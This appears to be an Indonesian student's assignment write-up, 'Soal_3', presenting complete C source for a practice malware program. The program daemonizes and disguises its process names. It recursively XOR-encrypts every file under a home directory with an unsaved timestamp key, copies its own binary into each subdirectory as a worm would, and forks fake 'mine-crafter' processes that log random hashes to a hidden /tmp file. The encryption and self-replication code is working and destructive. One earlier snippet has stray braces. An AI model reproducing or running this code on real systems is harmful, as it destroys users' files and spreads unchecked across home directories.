# Soal_3
### a)
Buatlah malware.c yang akan bekerja secara daemon dan mengubah namanya menjadi /init.
```C
void create_daemon() {
    pid_t pid, sid;

    pid = fork();
    if (pid < 0) exit(EXIT_FAILURE);
    if (pid > 0) exit(EXIT_SUCCESS);

    umask(0);

    sid = setsid();
    if (sid < 0) exit(EXIT_FAILURE);

    if ((chdir("/")) < 0) exit(EXIT_FAILURE);

    for (int x = sysconf(_SC_OPEN_MAX); x >= 0; x--) {
        close(x);
    }
}

void menyamarkan_process(int argc, char **argv) {
    environ = NULL;
    prctl(PR_SET_NAME, "/soal_3", 0, 0, 0);

    if (argc > 0) {
        size_t len = 64;
        memset(argv[0], 0, len);
        strncpy(argv[0], "/soal_3", len);
    }
}
```
### b)
Lalu buatlah anak fitur pertama yang akan memindai directory saat ini dan mengenkripsi file dan folder menggunakan xor dengan timestamp saat dijalankan.
```C
void child_1(int argc, char **argv) {
    pid_t child = fork();
    if (child < 0) exit(EXIT_FAILURE);
    if (child == 0) {
        prctl(PR_SET_NAME, "encryptor", 0, 0, 0);

        if (argc > 0) {
            size_t len = 64;
            memset(argv[0], 0, len);
            strncpy(argv[0], "encryptor", len);
        }

        unsigned int key = (unsigned int)time(NULL);
        while (1) {
            encrypt("/home/isolate", key);
        }
        exit(EXIT_SUCCESS);
    }
}
```
### c)
Setelah itu buat anak fitur kedua yang akan menyebarkan malware ini dengan cara membuat salinan binary malware di setiap directory yang ada di home.
```C
void child_2(int argc, char **argv) {
    pid_t child = fork();
    if (child < 0) exit(EXIT_FAILURE);
    if (child == 0) {
        prctl(PR_SET_NAME, "trojan.wrm", 0, 0, 0);

        if (argc > 0) {
            size_t len = 64;
            memset(argv[0], 0, len);
            strncpy(argv[0], "trojan.wrm", len);
        }

        while (1) {
            copy_self_recursive("/home/target");
        }
        exit(EXIT_SUCCESS);
    }
}
```
### d)
Anak fitur pertama dan kedua harus berjalan berulang ulang dengan interval 30 detik.
```C
// Kedua child ditambahkan sleep(30) agar ada interval
void child_1(int argc, char **argv) {
    pid_t child = fork();
    if (child < 0) exit(EXIT_FAILURE);
    if (child == 0) {
        prctl(PR_SET_NAME, "encryptor", 0, 0, 0);

        if (argc > 0) {
            size_t len = 64;
            memset(argv[0], 0, len);
            strncpy(argv[0], "encryptor", len);
        }

        unsigned int key = (unsigned int)time(NULL);
        while (1) {
            encrypt("/home/isolate", key);
            sleep(30);
        }
        exit(EXIT_SUCCESS);
    }
}

void child_2(int argc, char **argv) {
    pid_t child = fork();
    if (child < 0) exit(EXIT_FAILURE);
    if (child == 0) {
        prctl(PR_SET_NAME, "trojan.wrm", 0, 0, 0);

        if (argc > 0) {
            size_t len = 64;
            memset(argv[0], 0, len);
            strncpy(argv[0], "trojan.wrm", len);
        }

        while (1) {
            copy_self_recursive("/home/target");
            sleep(30);
        }
        exit(EXIT_SUCCESS);
    }
}
```
### e)
Tambahkan anak fitur ketiga yang akan membuat sebuah fork bomb di dalam perangkat.
```C
void child_3(int argc, char **argv) {
    pid_t rodok = fork();
    if (rodok < 0) exit(EXIT_FAILURE);
    if (rodok == 0) {
        prctl(PR_SET_NAME, "rodok.exe", 0, 0, 0);

        if (argc > 0) {
            size_t len = 64;
            memset(argv[0], 0, len);
            strncpy(argv[0], "rodok.exe", len);
        }

        srand(time(NULL));
        int max_miner = sysconf(_SC_NPROCESSORS_ONLN);
        if (max_miner < 3) max_miner = 3;

        for (int i = 0; i < max_miner; i++) {
            pid_t miner = fork();
            if (miner == 0) {
                mine_worker(i, argc, argv);
                exit(EXIT_SUCCESS);
            }
        }

        while (1) sleep(60);
        exit(EXIT_SUCCESS);
    }
}
```
### f)
Setelah itu tambahkan fitur pada fork bomb tadi dimana setiap fork dinamakan mine-crafter-XX dan akan melakukan cryptomining(cryptomining yang dimaksud adalah membuat sebuah hash hexadecimal (base 16) random sepanjang 64 char). Masing masing hash dibuat secara random dalam rentang waktu 3 detik - 30 detik.
```C
char *generate_hash() {
    static char charset[] = "0123456789abcdef";
    static char hash[65];
    for (int i = 0; i < 64; i++) {
        hash[i] = charset[rand() % 16];
    }
    hash[64] = '\0';
    return hash;
}

void mine_worker(int id, int argc, char **argv) {
  prctl(PR_SET_PDEATHSIG, SIGTERM);

  char procname[64];
  snprintf(procname, sizeof(procname), "mine-crafter-%d", id);
  prctl(PR_SET_NAME, procname, 0, 0, 0);

  if (argc > 0) {
      size_t len = 64;
      memset(argv[0], 0, len);
      strncpy(argv[0], procname, len);
  }

// Seed unik untuk setiap worker
  srand(time(NULL) ^ (getpid() + id));

  while (1) {
      int delay = (rand() % 28) + 3;
      sleep(delay);

      time_t now = time(NULL);
      struct tm *t = localtime(&now);

      char logline[128];
      snprintf(logline, sizeof(logline), "[%04d-%02d-%02d %02d:%02d:%02d][Miner %02d] %s\n",
               t->tm_year + 1900, t->tm_mon + 1, t->tm_mday,
               t->tm_hour, t->tm_min, t->tm_sec,
               id, generate_hash());

      }
  }
}
```
### g)
mine-crafter-XX akan mengumpulkan hash yang sudah dibuat dan menyimpannya di dalam file /tmp/.miner.log
```C
void mine_worker(int id, int argc, char **argv) {
  prctl(PR_SET_PDEATHSIG, SIGTERM);

  char procname[64];
  snprintf(procname, sizeof(procname), "mine-crafter-%d", id);
  prctl(PR_SET_NAME, procname, 0, 0, 0);

  if (argc > 0) {
      size_t len = 64;
      memset(argv[0], 0, len);
      strncpy(argv[0], procname, len);
  }

  srand(time(NULL) ^ (getpid() + id)); 

  while (1) {
      int delay = (rand() % 28) + 3;
      sleep(delay);

      time_t now = time(NULL);
      struct tm *t = localtime(&now);

      char logline[128];
      snprintf(logline, sizeof(logline), "[%04d-%02d-%02d %02d:%02d:%02d][Miner %02d] %s\n",
               t->tm_year + 1900, t->tm_mon + 1, t->tm_mday,
               t->tm_hour, t->tm_min, t->tm_sec,
               id, generate_hash());

//Output dari mine-crafter-XX akan disimpan di file /tmp/.miner.log
      FILE *log = fopen("/tmp/.miner.log", "a");
      if (log) {
          fputs(logline, log);
          fclose(log);
      }
  }
}
```
### h)
Terakhir, tambahkan fitur dimana jika rodok.exe dimatikan, maka seluruh mine-crafter-XX juga akan mati.

#### Struktur akhir dari malware.c
```C
#include <sys/types.h>
#include <sys/stat.h>
#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <errno.h>
#include <unistd.h>
#include <syslog.h>
#include <string.h>
#include <sys/prctl.h>
#include <time.h>
#include <dirent.h>
#include <limits.h>
#include <signal.h>

extern char **environ;

void create_daemon() {
    pid_t pid, sid;

    pid = fork();
    if (pid < 0) exit(EXIT_FAILURE);
    if (pid > 0) exit(EXIT_SUCCESS);

    umask(0);

    sid = setsid();
    if (sid < 0) exit(EXIT_FAILURE);

    if ((chdir("/")) < 0) exit(EXIT_FAILURE);

    for (int x = sysconf(_SC_OPEN_MAX); x >= 0; x--) {
        close(x);
    }
}

void menyamarkan_process(int argc, char **argv) {
    environ = NULL;
    prctl(PR_SET_NAME, "/soal_3", 0, 0, 0);

    if (argc > 0) {
        size_t len = 64;
        memset(argv[0], 0, len);
        strncpy(argv[0], "/soal_3", len);
    }
}

void xorfile(const char *filename, unsigned int key) {
    char tmp_filename[512];
    snprintf(tmp_filename, sizeof(tmp_filename), "%s.tmp", filename);

    FILE *in = fopen(filename, "rb");
    FILE *out = fopen(tmp_filename, "wb");

    if (!in || !out) {
        perror("File error");
        if (in) fclose(in);
        if (out) fclose(out);
        return;
    }

    int ch;
    while ((ch = fgetc(in)) != EOF) {
        fputc(ch ^ key, out);
    }

    fclose(in);
    fclose(out);

    remove(filename);
    rename(tmp_filename, filename);
}

void encrypt(const char *path, unsigned int key) {
    DIR *dir = opendir(path);
    if (!dir) return;

    struct dirent *entry;
    char fullpath[1024];

    while ((entry = readdir(dir)) != NULL) {
        if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0)
            continue;

        snprintf(fullpath, sizeof(fullpath), "%s/%s", path, entry->d_name);

        struct stat st;
        if (stat(fullpath, &st) == -1) continue;

        if (S_ISDIR(st.st_mode)) {
            encrypt(fullpath, key);
        } else if (S_ISREG(st.st_mode)) {
            xorfile(fullpath, key);
        }
    }
    closedir(dir);
}

void copy_self_recursive(const char *dirpath) {
    DIR *dir = opendir(dirpath);
    if (!dir) return;

    struct dirent *entry;
    char path[PATH_MAX];

    char exe_path[PATH_MAX];
    ssize_t len = readlink("/proc/self/exe", exe_path, sizeof(exe_path) - 1);
    if (len == -1) {
        perror("readlink");
        closedir(dir);
        return;
    }
    exe_path[len] = '\0';

    const char *filename = strrchr(exe_path, '/');
    filename = filename ? filename + 1 : exe_path;

    while ((entry = readdir(dir)) != NULL) {
        if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0)
            continue;

        snprintf(path, sizeof(path), "%s/%s", dirpath, entry->d_name);

        struct stat st;
        if (stat(path, &st) == -1) continue;

        if (S_ISDIR(st.st_mode)) {
            copy_self_recursive(path);
        }
    }

    char target_path[PATH_MAX];
    snprintf(target_path, sizeof(target_path), "%s/%s", dirpath, filename);

    FILE *src = fopen(exe_path, "rb");
    FILE *dest = fopen(target_path, "wb");

    if (!src || !dest) {
        perror("copy error");
        if (src) fclose(src);
        if (dest) fclose(dest);
        closedir(dir);
        return;
    }

    char buffer[4096];
    size_t n;
    while ((n = fread(buffer, 1, sizeof(buffer), src)) > 0) {
        fwrite(buffer, 1, n, dest);
    }

    fclose(src);
    fclose(dest);
    closedir(dir);
}

char *generate_hash() {
    static char charset[] = "0123456789abcdef";
    static char hash[65];
    for (int i = 0; i < 64; i++) {
        hash[i] = charset[rand() % 16];
    }
    hash[64] = '\0';
    return hash;
}

void mine_worker(int id, int argc, char **argv) {
  prctl(PR_SET_PDEATHSIG, SIGTERM);

  char procname[64];
  snprintf(procname, sizeof(procname), "mine-crafter-%d", id);
  prctl(PR_SET_NAME, procname, 0, 0, 0);

  if (argc > 0) {
      size_t len = 64;
      memset(argv[0], 0, len);
      strncpy(argv[0], procname, len);
  }

  srand(time(NULL) ^ (getpid() + id));

  while (1) {
      int delay = (rand() % 28) + 3;
      sleep(delay);

      time_t now = time(NULL);
      struct tm *t = localtime(&now);

      char logline[128];
      snprintf(logline, sizeof(logline), "[%04d-%02d-%02d %02d:%02d:%02d][Miner %02d] %s\n",
               t->tm_year + 1900, t->tm_mon + 1, t->tm_mday,
               t->tm_hour, t->tm_min, t->tm_sec,
               id, generate_hash());

      FILE *log = fopen("/tmp/.miner.log", "a");
      if (log) {
          fputs(logline, log);
          fclose(log);
      }
  }
}


void child_1(int argc, char **argv) {
    pid_t child = fork();
    if (child < 0) exit(EXIT_FAILURE);
    if (child == 0) {
        prctl(PR_SET_NAME, "encryptor", 0, 0, 0);

        if (argc > 0) {
            size_t len = 64;
            memset(argv[0], 0, len);
            strncpy(argv[0], "encryptor", len);
        }

        unsigned int key = (unsigned int)time(NULL);
        while (1) {
            encrypt("/home/isolate", key);
            sleep(30);
        }
        exit(EXIT_SUCCESS);
    }
}

void child_2(int argc, char **argv) {
    pid_t child = fork();
    if (child < 0) exit(EXIT_FAILURE);
    if (child == 0) {
        prctl(PR_SET_NAME, "trojan.wrm", 0, 0, 0);

        if (argc > 0) {
            size_t len = 64;
            memset(argv[0], 0, len);
            strncpy(argv[0], "trojan.wrm", len);
        }

        while (1) {
            copy_self_recursive("/home/target");
            sleep(30);
        }
        exit(EXIT_SUCCESS);
    }
}

void child_3(int argc, char **argv) {
    pid_t rodok = fork();
    if (rodok < 0) exit(EXIT_FAILURE);
    if (rodok == 0) {
        prctl(PR_SET_NAME, "rodok.exe", 0, 0, 0);

        if (argc > 0) {
            size_t len = 64;
            memset(argv[0], 0, len);
            strncpy(argv[0], "rodok.exe", len);
        }

        srand(time(NULL));
        int max_miner = sysconf(_SC_NPROCESSORS_ONLN);
        if (max_miner < 3) max_miner = 3;

        for (int i = 0; i < max_miner; i++) {
            pid_t miner = fork();
            if (miner == 0) {
                mine_worker(i, argc, argv);
                exit(EXIT_SUCCESS);
            }
        }

        while (1) sleep(60);
        exit(EXIT_SUCCESS);
    }
}

int main(int argc, char *argv[]) {
    create_daemon();
    menyamarkan_process(argc, argv);
    child_1(argc, argv);
    child_2(argc, argv);
    child_3(argc, argv);
    while (1) {
        sleep(60);
    }
    return 0;
}
```
